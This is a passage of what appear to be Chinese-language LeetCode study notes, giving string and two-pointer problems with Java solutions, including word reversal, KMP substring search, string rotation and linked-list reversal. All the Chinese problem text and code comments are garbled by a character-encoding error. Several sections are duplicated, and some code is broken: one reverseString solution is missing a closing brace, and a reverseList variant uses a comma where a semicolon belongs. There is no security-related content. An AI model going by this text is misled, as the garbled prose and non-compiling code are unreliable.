if(s.charAt(i) == ' '){\n                sb.append(\"%20\");\n            } else {\n                sb.append(s.charAt(i));\n            }\n        }      \n        return sb.toString();\n    }\n}\n```\n\n### [151. åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯ ](https://leetcode.cn/problems/reverse-words-in-a-string/)\n\nç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸² `s` ï¼Œè¯·ä½ åè½¬å­—ç¬¦ä¸²ä¸­ **å•è¯** çš„é¡ºåºã€‚\n\n**å•è¯** æ˜¯ç”±éç©ºæ ¼å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ã€‚`s` ä¸­ä½¿ç”¨è‡³å°‘ä¸€ä¸ªç©ºæ ¼å°†å­—ç¬¦ä¸²ä¸­çš„ **å•è¯** åˆ†éš”å¼€ã€‚\n\nè¿”å› **å•è¯** é¡ºåºé¢ å€’ä¸” **å•è¯** ä¹‹é—´ç”¨å•ä¸ªç©ºæ ¼è¿æ¥çš„ç»“æœå­—ç¬¦ä¸²ã€‚\n\n**æ³¨æ„ï¼š**è¾“å…¥å­—ç¬¦ä¸² `s`ä¸­å¯èƒ½ä¼šå­˜åœ¨å‰å¯¼ç©ºæ ¼ã€å°¾éšç©ºæ ¼æˆ–è€…å•è¯é—´çš„å¤šä¸ªç©ºæ ¼ã€‚è¿”å›çš„ç»“æœå­—ç¬¦ä¸²ä¸­ï¼Œå•è¯é—´åº”å½“ä»…ç”¨å•ä¸ªç©ºæ ¼åˆ†éš”ï¼Œä¸”ä¸åŒ…å«ä»»ä½•é¢å¤–çš„ç©ºæ ¼ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = \"the sky is blue\"\nè¾“å‡ºï¼š\"blue is sky the\"\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = \"  hello world  \"\nè¾“å‡ºï¼š\"world hello\"\nè§£é‡Šï¼šåè½¬åçš„å­—ç¬¦ä¸²ä¸­ä¸èƒ½å­˜åœ¨å‰å¯¼ç©ºæ ¼å’Œå°¾éšç©ºæ ¼ã€‚\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = \"a good   example\"\nè¾“å‡ºï¼š\"example good a\"\nè§£é‡Šï¼šå¦‚æœä¸¤ä¸ªå•è¯é—´æœ‰å¤šä½™çš„ç©ºæ ¼ï¼Œåè½¬åçš„å­—ç¬¦ä¸²éœ€è¦å°†å•è¯é—´çš„ç©ºæ ¼å‡å°‘åˆ°ä»…æœ‰ä¸€ä¸ªã€‚\n```\n\n------\n\n```java\nclass Solution {\n    public String reverseWords(String s) {\n        // é™¤å»å¼€å¤´å’Œæœ«å°¾çš„ç©ºç™½å­—ç¬¦\n        s = s.trim();\n        // æ­£åˆ™åŒ¹é…è¿ç»­çš„ç©ºç™½å­—ç¬¦ä½œä¸ºåˆ†éš”ç¬¦åˆ†å‰²\n        List<String> wordList = Arrays.asList(s.split(\"\\\\s+\"));\n        Collections.reverse(wordList);\n        return String.join(\" \", wordList);\n    }\n}\n\n// åˆ†å‰² + å€’åº\nclass Solution {\n    public String reverseWords(String s) {\n        String[] strs = s.trim().split(\" \"); // åˆ é™¤é¦–å°¾ç©ºæ ¼ï¼Œåˆ†å‰²å­—ç¬¦ä¸²\n        StringBuilder res = new StringBuilder();\n        for(int i = strs.length - 1; i >= 0; i--) { // å€’åºéå†å•è¯åˆ—è¡¨\n            if(strs[i].equals(\"\")) continue; // é‡åˆ°ç©ºåˆ™è·³è¿‡\n            res.append(strs[i] + \" \"); // å°†å•è¯æ‹¼æ¥è‡³ StringBuilder\n        }\n        return res.toString().trim(); // è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ é™¤å°¾éƒ¨ç©ºæ ¼ï¼Œå¹¶è¿”å›\n    }\n}\n\n// åŒæŒ‡é’ˆ\nclass Solution {\n    public String reverseWords(String s) {\n        s = s.trim(); // åˆ é™¤é¦–å°¾ç©ºæ ¼\n        int j = s.length() - 1, i = j;\n        StringBuilder res = new StringBuilder();\n        while(i >= 0) {\n            while(i >= 0 && s.charAt(i) != ' ') i--; // æœç´¢é¦–ä¸ªç©ºæ ¼\n            res.append(s.substring(i + 1, j + 1) + \" \"); // æ·»åŠ å•è¯\n            while(i >= 0 && s.charAt(i) == ' ') i--; // è·³è¿‡å•è¯é—´ç©ºæ ¼\n            j = i; // j æŒ‡å‘ä¸‹ä¸ªå•è¯çš„å°¾å­—ç¬¦\n        }\n        return res.toString().trim(); // è½¬åŒ–ä¸ºå­—ç¬¦ä¸²å¹¶è¿”å›\n    }\n}\n```\n\n### [å‰‘æŒ‡ Offer 58 - II. å·¦æ—‹è½¬å­—ç¬¦ä¸²](https://leetcode.cn/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof/)\n\nå­—ç¬¦ä¸²çš„å·¦æ—‹è½¬æ“ä½œæ˜¯æŠŠå­—ç¬¦ä¸²å‰é¢çš„è‹¥å¹²ä¸ªå­—ç¬¦è½¬ç§»åˆ°å­—ç¬¦ä¸²çš„å°¾éƒ¨ã€‚è¯·å®šä¹‰ä¸€ä¸ªå‡½æ•°å®ç°å­—ç¬¦ä¸²å·¦æ—‹è½¬æ“ä½œçš„åŠŸèƒ½ã€‚æ¯”å¦‚ï¼Œè¾“å…¥å­—ç¬¦ä¸²\"abcdefg\"å’Œæ•°å­—2ï¼Œè¯¥å‡½æ•°å°†è¿”å›å·¦æ—‹è½¬ä¸¤ä½å¾—åˆ°çš„ç»“æœ\"cdefgab\"ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥: s = \"abcdefg\", k = 2\nè¾“å‡º: \"cdefgab\"\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥: s = \"lrloseumgh\", k = 6\nè¾“å‡º: \"umghlrlose\"\n```\n\n```java\nclass Solution {\n    public String reverseLeftWords(String s, int n) {\n        StringBuilder sb = new StringBuilder();\n        for(int i = n; i < s.length(); i++){\n            sb.append(s.charAt(i));\n        }\n        for(int i = 0; i < n; i++){\n             sb.append(s.charAt(i));\n        }\n        return sb.toString();\n    }\n}\n\nclass Solution {\n    public String reverseLeftWords(String s, int n) {\n        return s.substring(n, s.length()) + s.substring(0, n);\n    }\n}\n```\n\n### [28. æ‰¾å‡ºå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ä¸‹æ ‡](https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/)\n\nç»™ä½ ä¸¤ä¸ªå­—ç¬¦ä¸² `haystack` å’Œ `needle` ï¼Œè¯·ä½ åœ¨ `haystack` å­—ç¬¦ä¸²ä¸­æ‰¾å‡º `needle` å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ä¸‹æ ‡ï¼ˆä¸‹æ ‡ä» 0 å¼€å§‹ï¼‰ã€‚å¦‚æœ `needle` ä¸æ˜¯ `haystack` çš„ä¸€éƒ¨åˆ†ï¼Œåˆ™è¿”å›  `-1` ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šhaystack = \"sadbutsad\", needle = \"sad\"\nè¾“å‡ºï¼š0\nè§£é‡Šï¼š\"sad\" åœ¨ä¸‹æ ‡ 0 å’Œ 6 å¤„åŒ¹é…ã€‚\nç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ä¸‹æ ‡æ˜¯ 0 ï¼Œæ‰€ä»¥è¿”å› 0 ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šhaystack = \"leetcode\", needle = \"leeto\"\nè¾“å‡ºï¼š-1\nè§£é‡Šï¼š\"leeto\" æ²¡æœ‰åœ¨ \"leetcode\" ä¸­å‡ºç°ï¼Œæ‰€ä»¥è¿”å› -1 ã€‚\n```\n\n------\n\n**æš´åŠ›ç ´è§£**\n\n```java\nclass Solution {\n    public int strStr(String haystack, String needle) {\n        int n = haystack.length(), m = needle.length();\n        // æšä¸¾åŸä¸²çš„ã€Œå‘èµ·ç‚¹ã€\n        for(int i = 0; i <= n - m; i++){\n            boolean flag = true;\n            for(int j = 0; j < m; j++){\n                // ä»åŸä¸²çš„ã€Œå‘èµ·ç‚¹ã€å’ŒåŒ¹é…ä¸²çš„ã€Œé¦–ä½ã€å¼€å§‹ï¼Œå°è¯•åŒ¹é…\n                if(haystack.charAt(i + j) != needle.charAt(j)){\n                    flag = false;\n                    break;\n                }\n            }\n            // å¦‚æœèƒ½å¤Ÿå®Œå…¨åŒ¹é…ï¼Œè¿”å›åŸä¸²çš„ã€Œå‘èµ·ç‚¹ã€ä¸‹æ ‡\n            if(flag) return i;\n        }\n        return -1;\n    }\n}\n```\n\n**KMPç®—æ³•**\n\n```java\nclass Solution {\n    public static int strStr(String haystack, String needle) {\n        int n = haystack.length(), m = needle.length();\n        if (m == 0) return 0;\n\n        // 1.æ„å»º next æ•°ç»„\n        int[] next = new int[m]; //next[0]=0\n        for (int i = 1, j = 0; i < m; i++) {\n            // åŒ¹é…ä¸æˆåŠŸçš„è¯ï¼Œj = next(j-1)\n            while (j > 0 && needle.charAt(i) != needle.charAt(j)) {\n                j = next[j - 1];\n            }\n            // åŒ¹é…æˆåŠŸçš„è¯ï¼Œj++\n            if (needle.charAt(i) == needle.charAt(j)) {\n                j++;\n            }\n            // æ›´æ–° next[i]\n            next[i] = j;\n        }\n\n        // 2.åŒ¹é…è¿‡ç¨‹\n        for (int i = 0, j = 0; i < n; i++) {\n            // åŒ¹é…ä¸æˆåŠŸ j = next(j-1)\n            while (j > 0 && haystack.charAt(i) != needle.charAt(j)) {\n                j = next[j - 1];\n            }\n            // åŒ¹é…æˆåŠŸçš„è¯ï¼Œj++\n            if (haystack.charAt(i) == needle.charAt(j)) {\n                j++;\n            }\n            if (j == m) {\n                return i - m + 1;\n            }\n        }\n        return -1;\n    }\n}\n```\n\n\n\n### [459. é‡å¤çš„å­å­—ç¬¦ä¸²](https://leetcode.cn/problems/repeated-substring-pattern/description/)\n\nç»™å®šä¸€ä¸ªéç©ºçš„å­—ç¬¦ä¸² `s` ï¼Œæ£€æŸ¥æ˜¯å¦å¯ä»¥é€šè¿‡ç”±å®ƒçš„ä¸€ä¸ªå­ä¸²é‡å¤å¤šæ¬¡æ„æˆã€‚\n\n**ç¤ºä¾‹ 1:**\n\n```properties\nè¾“å…¥: s = \"abab\"\nè¾“å‡º: true\nè§£é‡Š: å¯ç”±å­ä¸² \"ab\" é‡å¤ä¸¤æ¬¡æ„æˆã€‚\n```\n\n**ç¤ºä¾‹ 2:**\n\n```properties\nè¾“å…¥: s = \"aba\"\nè¾“å‡º: false\n```\n\n**ç¤ºä¾‹ 3:**\n\n```properties\nè¾“å…¥: s = \"abcabcabcabc\"\nè¾“å‡º: true\nè§£é‡Š: å¯ç”±å­ä¸² \"abc\" é‡å¤å››æ¬¡æ„æˆã€‚ (æˆ–å­ä¸² \"abcabc\" é‡å¤ä¸¤æ¬¡æ„æˆã€‚)\n```\n\n**æ–¹æ³•ä¸€ï¼šæšä¸¾**\n\nå¦‚æœä¸€ä¸ªé•¿åº¦ä¸º n çš„å­—ç¬¦ä¸² s å¯ä»¥ç”±å®ƒçš„ä¸€ä¸ªé•¿åº¦ä¸º m çš„å­ä¸² sâ€² é‡å¤å¤šæ¬¡æ„æˆï¼Œé‚£ä¹ˆï¼š\n\n-   n ä¸€å®šæ˜¯ m çš„å€æ•°ï¼›\n-   sâ€² ä¸€å®šæ˜¯ s çš„å‰ç¼€ï¼›\n-   å¯¹äºä»»æ„çš„ `iâˆˆ[m,n)`ï¼Œæœ‰ `s[i] = s[i âˆ’ m]`ã€‚\n\nå°ä¼˜åŒ–ï¼šå› ä¸ºå­ä¸²è‡³å°‘éœ€è¦é‡å¤ä¸€æ¬¡ï¼Œæ‰€ä»¥ m ä¸ä¼šå¤§äº n çš„ä¸€åŠï¼Œæ‰€ä»¥åªéœ€åœ¨ `[1,n/2]`çš„èŒƒå›´å†…æšä¸¾ m å³å¯ã€‚\n\n```java\nclass Solution {\n    public boolean repeatedSubstringPattern(String s) {\n        int n = s.length();\n        for(int m = 1; m <= n/2; m++){\n            if(n % m == 0){\n                boolean match = true;\n                for(int i = m; i < n; i++){\n                    if(s.charAt(i) != s.charAt(i - m)) {\n                        match = false;\n                        break;\n                    }\n                }\n                if(match){\n                    return true;\n                }\n            }\n        }\n        return false;\n    }\n}\n```\n\n## â‘¥åŒæŒ‡é’ˆ\n\n### [344. åè½¬å­—ç¬¦ä¸²](https://leetcode.cn/problems/reverse-string/)\n\nç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå…¶ä½œç”¨æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²åè½¬è¿‡æ¥ã€‚è¾“å…¥å­—ç¬¦ä¸²ä»¥å­—ç¬¦æ•°ç»„ `s` çš„å½¢å¼ç»™å‡ºã€‚\n\nä¸è¦ç»™å¦å¤–çš„æ•°ç»„åˆ†é…é¢å¤–çš„ç©ºé—´ï¼Œä½ å¿…é¡»**åŸåœ°ä¿®æ”¹è¾“å…¥æ•°ç»„**ã€ä½¿ç”¨ O(1) çš„é¢å¤–ç©ºé—´è§£å†³è¿™ä¸€é—®é¢˜ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = [\"h\",\"e\",\"l\",\"l\",\"o\"]\nè¾“å‡ºï¼š[\"o\",\"l\",\"l\",\"e\",\"h\"]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = [\"H\",\"a\",\"n\",\"n\",\"a\",\"h\"]\nè¾“å‡ºï¼š[\"h\",\"a\",\"n\",\"n\",\"a\",\"H\"]\n```\n\n------\n\n```java\nclass Solution {\n    public void reverseString(char[] s) {\n        int left = 0, right = s.length - 1;\n        while(left < right){\n            char tmp  = s[left];\n            s[left] = s[right];\n            s[right] = tmp;\n            left++;\n            right--;\n    }\n}\n  \nclass Solution {\n    public void reverseString(char[] s) {\n        int n = s.length;\n        for (int left = 0, right = n - 1; left < right; ++left, --right) {\n            char tmp = s[left];\n            s[left] = s[right];\n            s[right] = tmp;\n        }\n    }\n}\n  \nclass Solution {\n    public void reverseString(char[] s) {\n        int l = 0;\n        int r = s.length - 1;\n        while (l < r) {\n            s[l] ^= s[r];  //æ„é€  a ^ b çš„ç»“æœï¼Œå¹¶æ”¾åœ¨ a ä¸­\n            s[r] ^= s[l];  //å°† a ^ b è¿™ä¸€ç»“æœå† ^ b ï¼Œå­˜å…¥bä¸­ï¼Œæ­¤æ—¶ b = a, a = a ^ b\n            s[l] ^= s[r];  //a ^ b çš„ç»“æœå† ^ a ï¼Œå­˜å…¥ a ä¸­ï¼Œæ­¤æ—¶ b = a, a = b å®Œæˆäº¤æ¢\n            l++;\n            r--;\n        }\n    }\n}  \n```\n\n### [27. ç§»é™¤å…ƒç´ ](https://leetcode.cn/problems/remove-element/)\n\nç»™ä½ ä¸€ä¸ªæ•°ç»„ `nums` å’Œä¸€ä¸ªå€¼ `val`ï¼Œä½ éœ€è¦åŸåœ°ç§»é™¤æ‰€æœ‰æ•°å€¼ç­‰äº `val` çš„å…ƒç´ ï¼Œå¹¶è¿”å›ç§»é™¤åæ•°ç»„çš„æ–°é•¿åº¦ã€‚\n\nä¸è¦ä½¿ç”¨é¢å¤–çš„æ•°ç»„ç©ºé—´ï¼Œä½ å¿…é¡»ä»…ä½¿ç”¨ `O(1)` é¢å¤–ç©ºé—´å¹¶åŸåœ°ä¿®æ”¹è¾“å…¥æ•°ç»„ã€‚\n\nå…ƒç´ çš„é¡ºåºå¯ä»¥æ”¹å˜ã€‚ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚\n\n```java\n//åŒæŒ‡é’ˆ\nclass Solution {\n    public int removeElement(int[] nums, int val) {\n        //å¿«æ…¢æŒ‡é’ˆè§£æ³•\n        int slow = 0; //æ…¢æŒ‡é’ˆ\n        //å¿«æŒ‡é’ˆï¼Œæ— è®ºä¸valå€¼æ˜¯å¦ç›¸åŒæ¯éå†ä¸€æ¬¡éƒ½è¦ç§»åŠ¨ä¸€ä½\n        for(int fast = 0; fast < nums.length; fast++){\n            //å¿«æŒ‡é’ˆå…ˆèµ°ï¼Œåˆ¤æ–­å¿«æŒ‡é’ˆæŒ‡å‘çš„å…ƒç´ æ˜¯å¦ç­‰äºval\n            if(nums[fast] != val){\n                nums[slow] = nums[fast];\n                slow++;  //åªæœ‰å½“å¿«æŒ‡é’ˆä¸ç­‰äºvalçš„æ—¶å€™ï¼Œæ…¢æŒ‡é’ˆæ‰å’Œå¿«æŒ‡é’ˆä¸€èµ·ç§»åŠ¨ä¸€ä½\n            }\n        }\n        return slow;\n    }\n}\n\n//é€šç”¨è§£æ³•\nclass Solution {\n    public int removeElement(int[] nums, int val) {\n        int idx = 0;\n        for (int x : nums) {\n            if (x != val) nums[idx++] = x;\n        }\n        return idx;\n    }\n}\n```\n\n###  [å‰‘æŒ‡ Offer 05. æ›¿æ¢ç©ºæ ¼](https://leetcode.cn/problems/ti-huan-kong-ge-lcof/)\n\nè¯·å®ç°ä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸² `s` ä¸­çš„æ¯ä¸ªç©ºæ ¼æ›¿æ¢æˆ\"%20\"ã€‚\n\n```properties\nè¾“å…¥ï¼šs = \"We are happy.\"\nè¾“å‡ºï¼š\"We%20are%20happy.\"\n```\n\n```java\nclass Solution {\n    public String replaceSpace(String s) {\n        StringBuilder sb = new StringBuilder();\n        for(int i = 0; i < s.length(); i++){\n            if(s.charAt(i) == ' '){\n                sb.append(\"%20\");\n            } else {\n                sb.append(s.charAt(i));\n            }\n        }      \n        return sb.toString();\n    }\n}\n```\n\n### [151. åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯ ](https://leetcode.cn/problems/reverse-words-in-a-string/)\n\nç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸² `s` ï¼Œè¯·ä½ åè½¬å­—ç¬¦ä¸²ä¸­ **å•è¯** çš„é¡ºåºã€‚\n\n**å•è¯** æ˜¯ç”±éç©ºæ ¼å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ã€‚`s` ä¸­ä½¿ç”¨è‡³å°‘ä¸€ä¸ªç©ºæ ¼å°†å­—ç¬¦ä¸²ä¸­çš„ **å•è¯** åˆ†éš”å¼€ã€‚\n\nè¿”å› **å•è¯** é¡ºåºé¢ å€’ä¸” **å•è¯** ä¹‹é—´ç”¨å•ä¸ªç©ºæ ¼è¿æ¥çš„ç»“æœå­—ç¬¦ä¸²ã€‚\n\n**æ³¨æ„ï¼š**è¾“å…¥å­—ç¬¦ä¸² `s`ä¸­å¯èƒ½ä¼šå­˜åœ¨å‰å¯¼ç©ºæ ¼ã€å°¾éšç©ºæ ¼æˆ–è€…å•è¯é—´çš„å¤šä¸ªç©ºæ ¼ã€‚è¿”å›çš„ç»“æœå­—ç¬¦ä¸²ä¸­ï¼Œå•è¯é—´åº”å½“ä»…ç”¨å•ä¸ªç©ºæ ¼åˆ†éš”ï¼Œä¸”ä¸åŒ…å«ä»»ä½•é¢å¤–çš„ç©ºæ ¼ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = \"the sky is blue\"\nè¾“å‡ºï¼š\"blue is sky the\"\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = \"  hello world  \"\nè¾“å‡ºï¼š\"world hello\"\nè§£é‡Šï¼šåè½¬åçš„å­—ç¬¦ä¸²ä¸­ä¸èƒ½å­˜åœ¨å‰å¯¼ç©ºæ ¼å’Œå°¾éšç©ºæ ¼ã€‚\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = \"a good   example\"\nè¾“å‡ºï¼š\"example good a\"\nè§£é‡Šï¼šå¦‚æœä¸¤ä¸ªå•è¯é—´æœ‰å¤šä½™çš„ç©ºæ ¼ï¼Œåè½¬åçš„å­—ç¬¦ä¸²éœ€è¦å°†å•è¯é—´çš„ç©ºæ ¼å‡å°‘åˆ°ä»…æœ‰ä¸€ä¸ªã€‚\n```\n\n------\n\n```java\nclass Solution {\n    public String reverseWords(String s) {\n        // é™¤å»å¼€å¤´å’Œæœ«å°¾çš„ç©ºç™½å­—ç¬¦\n        s = s.trim();\n        // æ­£åˆ™åŒ¹é…è¿ç»­çš„ç©ºç™½å­—ç¬¦ä½œä¸ºåˆ†éš”ç¬¦åˆ†å‰²\n        List<String> wordList = Arrays.asList(s.split(\"\\\\s+\"));\n        Collections.reverse(wordList);\n        return String.join(\" \", wordList);\n    }\n}\n\n// åˆ†å‰² + å€’åº\nclass Solution {\n    public String reverseWords(String s) {\n        String[] strs = s.trim().split(\" \"); // åˆ é™¤é¦–å°¾ç©ºæ ¼ï¼Œåˆ†å‰²å­—ç¬¦ä¸²\n        StringBuilder res = new StringBuilder();\n        for(int i = strs.length - 1; i >= 0; i--) { // å€’åºéå†å•è¯åˆ—è¡¨\n            if(strs[i].equals(\"\")) continue; // é‡åˆ°ç©ºåˆ™è·³è¿‡\n            res.append(strs[i] + \" \"); // å°†å•è¯æ‹¼æ¥è‡³ StringBuilder\n        }\n        return res.toString().trim(); // è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ é™¤å°¾éƒ¨ç©ºæ ¼ï¼Œå¹¶è¿”å›\n    }\n}\n\n// åŒæŒ‡é’ˆ\nclass Solution {\n    public String reverseWords(String s) {\n        s = s.trim(); // åˆ é™¤é¦–å°¾ç©ºæ ¼\n        int j = s.length() - 1, i = j;\n        StringBuilder res = new StringBuilder();\n        while(i >= 0) {\n            while(i >= 0 && s.charAt(i) != ' ') i--; // æœç´¢é¦–ä¸ªç©ºæ ¼\n            res.append(s.substring(i + 1, j + 1) + \" \"); // æ·»åŠ å•è¯\n            while(i >= 0 && s.charAt(i) == ' ') i--; // è·³è¿‡å•è¯é—´ç©ºæ ¼\n            j = i; // j æŒ‡å‘ä¸‹ä¸ªå•è¯çš„å°¾å­—ç¬¦\n        }\n        return res.toString().trim(); // è½¬åŒ–ä¸ºå­—ç¬¦ä¸²å¹¶è¿”å›\n    }\n}\n```\n\n### [206. åè½¬é“¾è¡¨ ](https://leetcode.cn/problems/reverse-linked-list/)\n\nç»™ä½ å•é“¾è¡¨çš„å¤´èŠ‚ç‚¹ `head` ï¼Œè¯·ä½ åè½¬é“¾è¡¨ï¼Œå¹¶è¿”å›åè½¬åçš„é“¾è¡¨ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/rev1ex1.jpg)\n\n```\nè¾“å…¥ï¼šhead = [1,2,3,4,5]\nè¾“å‡ºï¼š[5,4,3,2,1]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/rev1ex2.jpg)\n\n```\nè¾“å…¥ï¼šhead = [1,2]\nè¾“å‡ºï¼š[2,1]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```\nè¾“å…¥ï¼šhead = []\nè¾“å‡ºï¼š[]\n```\n\n**è¿›é˜¶ï¼š**é“¾è¡¨å¯ä»¥é€‰ç”¨è¿­ä»£æˆ–é€’å½’æ–¹å¼å®Œæˆåè½¬ã€‚ä½ èƒ½å¦ç”¨ä¸¤ç§æ–¹æ³•è§£å†³è¿™é“é¢˜ï¼Ÿ\n\n```java\n//è¿­ä»£æ³•ï¼ˆåŒæŒ‡é’ˆæ³•ï¼‰\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        ListNode pre = null;\n        ListNode cur = head;\n        ListNode tmp = null;\n        while(cur != null){\n            tmp = cur.next;\n            cur.next = pre;\n            pre = cur;\n            cur = tmp;\n        }\n        return pre;\n    }\n}\n\n// é€’å½’æ³•\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        return reverse(null,head);\n    }\n    public ListNode reverse(ListNode pre, ListNode cur){\n        if (cur == null) {\n            return pre;\n        }\n        ListNode tmp = null;\n        tmp = cur.next;\n        cur.next = pre;\n        return reverse(cur,tmp);\n    }\n}\n\n//æ ˆå®ç°1(ä¸æ¨èï¼Œæ•ˆç‡ä¸é«˜)\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        Deque<ListNode> stack = new ArrayDeque<>();\n        while(head != null){\n            stack.push(head);\n            head = head.next;\n        }\n        ListNode dummy = new ListNode(0);\n        ListNode temp = dummy;\n        while(!stack.isEmpty()){\n            temp.next = stack.pop();\n            temp = temp.next;\n        }\n        temp.next = null; //æœ€åèŠ‚ç‚¹ä¸æ¥nullä¼šå½¢æˆç¯é“¾\n        return dummy.next;\n    }\n}\n//æ ˆå®ç°2(ä¸æ¨èï¼Œæ•ˆç‡ä¸é«˜)\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        Deque<ListNode> stack = new ArrayDeque<>();\n        while(head != null){\n            stack.add(head);\n            head = head.next;\n        }\n        ListNode dummy = new ListNode(0),\n        ListNode temp = dummy;\n        while(stack.size() != 0){\n            temp.next = new ListNode(stack.pop());//é˜²æ­¢å½¢æˆç¯é“¾\n            temp = temp.next;\n        }\n        return dummy.next;\n    }\n}\n\n```\n\n### [26. åˆ é™¤æœ‰åºæ•°ç»„ä¸­çš„é‡å¤é¡¹](https://leetcode.cn/problems/remove-duplicates-from-sorted-array/)\n\nç»™ä½ ä¸€ä¸ª **å‡åºæ’åˆ—** çš„æ•°ç»„ `nums` ï¼Œè¯·ä½  åŸåœ° åˆ é™¤é‡å¤å‡ºç°çš„å…ƒç´ ï¼Œä½¿æ¯ä¸ªå…ƒç´  **åªå‡ºç°ä¸€æ¬¡** ï¼Œè¿”å›åˆ é™¤åæ•°ç»„çš„æ–°é•¿åº¦ã€‚å…ƒç´ çš„ **ç›¸å¯¹é¡ºåº** åº”è¯¥ä¿æŒ **ä¸€è‡´** ã€‚\n\nç”±äºåœ¨æŸäº›è¯­è¨€ä¸­ä¸èƒ½æ”¹å˜æ•°ç»„çš„é•¿åº¦ï¼Œæ‰€ä»¥å¿…é¡»å°†ç»“æœæ”¾åœ¨æ•°ç»„numsçš„ç¬¬ä¸€éƒ¨åˆ†ã€‚æ›´è§„èŒƒåœ°è¯´ï¼Œå¦‚æœåœ¨åˆ é™¤é‡å¤é¡¹ä¹‹åæœ‰ `k` ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆ `nums` çš„å‰ `k` ä¸ªå…ƒç´ åº”è¯¥ä¿å­˜æœ€ç»ˆç»“æœã€‚\n\nå°†æœ€ç»ˆç»“æœæ’å…¥ `nums` çš„å‰ `k` ä¸ªä½ç½®åè¿”å› `k` ã€‚\n\nä¸è¦ä½¿ç”¨é¢å¤–çš„ç©ºé—´ï¼Œä½ å¿…é¡»åœ¨ åŸåœ° å¹¶åœ¨ä½¿ç”¨ O(1) é¢å¤–ç©ºé—´çš„æ¡ä»¶ä¸‹å®Œæˆã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [1,1,2]\nè¾“å‡ºï¼š2, nums = [1,2,_]\nè§£é‡Šï¼šå‡½æ•°åº”è¯¥è¿”å›æ–°çš„é•¿åº¦ 2 ï¼Œå¹¶ä¸”åŸæ•°ç»„ nums çš„å‰ä¸¤ä¸ªå…ƒç´ è¢«ä¿®æ”¹ä¸º 1, 2 ã€‚ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [0,0,1,1,1,2,2,3,3,4]\nè¾“å‡ºï¼š5, nums = [0,1,2,3,4]\nè§£é‡Šï¼šå‡½æ•°åº”è¯¥è¿”å›æ–°çš„é•¿åº¦ 5 ï¼Œ å¹¶ä¸”åŸæ•°ç»„ nums çš„å‰äº”ä¸ªå…ƒç´ è¢«ä¿®æ”¹ä¸º 0, 1, 2, 3, 4 ã€‚ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚\n```\n\n```java\n//åŒæŒ‡é’ˆ\nclass Solution {\n    public int removeDuplicates(int[] nums) {\n         //å¿«æ…¢æŒ‡é’ˆè§£æ³•\n        int slow = 0; //æ…¢æŒ‡é’ˆ\n        //å¿«æŒ‡é’ˆï¼Œæ— è®ºä¸valå€¼æ˜¯å¦ç›¸åŒæ¯éå†ä¸€æ¬¡éƒ½è¦ç§»åŠ¨ä¸€ä½\n        for(int fast = 0; fast < nums.length; fast++){\n            //å¿«æŒ‡é’ˆå…ˆèµ°ï¼Œåˆ¤æ–­å¿«æŒ‡é’ˆæŒ‡å‘çš„å…ƒç´ æ˜¯å¦ç­‰äºval\n            if(nums[fast] != nums[slow]){\n                nums[++slow] = nums[fast];\n            }\n        }\n        return slow + 1;\n    }\n}\n\nclass Solution {\n    public int removeDuplicates(int[] nums) {   \n        int idx = 0; \n        for (int x : nums) {\n            if (idx < 1 || nums[idx - 1] != x) \n                nums[idx++] = x;\n        }\n        return idx;\n    }\n}\n\n//é€šç”¨è§£æ³•\nclass Solution {\n    public int removeDuplicates(int[] nums) {   \n        return process(nums, 1);\n    }\n    